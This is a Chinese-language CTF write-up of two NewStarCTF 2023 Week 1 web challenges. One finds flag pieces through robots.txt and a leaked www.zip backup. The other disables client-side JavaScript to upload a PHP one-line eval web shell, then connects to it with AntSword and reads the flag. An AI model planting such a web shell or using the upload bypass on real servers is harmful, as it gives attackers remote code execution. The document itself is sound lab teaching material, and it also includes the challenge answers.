# NewStarCTF_2023

## WEEK1|WEB 泄露的秘密

进入给定靶机提示**“粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！”**：

1. 敏感信息很容易想到robots.txt，通过url访问robots.txt也确实有信息，得到第一段flag

   ```tex
   PART ONE: flag{r0bots_1s_s0_us3ful
   ```

2. 对于第二个敏感信息由于题目做得不多，试了网上说的常见的还是不行，干脆直接dirsearch扫服务器的目录发现除了robots.txt可以访问之外还有www.zip可以访问，在url添加www.zip下载压缩包，解压得到一个index.php文件中有第二段flag

   ```php
   $PART_TWO = "_4nd_www.zip_1s_s0_d4ng3rous}";
   ```


## WEEK1|WEB Begin of Upload

通过题目可以看到应该是利用文件上传的漏洞，在google浏览器先上传一个php文件发现有过滤，在**设置**中对js进行禁止就可以成功上传php文件，php文件内容如下：（利用一句话木马）

```php
<?php @eval($_POST['attack']);?>
```

成功将文件上传后利用蚁剑连接一句话木马成功进入服务器，在服务器的文件列表发现有f11114g文件打开得到flag

```tex
flag{b082c1e5-526a-4dbd-a5c4-00fa035bfb3c}
```

![1](https://github.com/2aurora2/CTF-WriteUp/blob/main/NewStarCTF_2023/image/1.png)

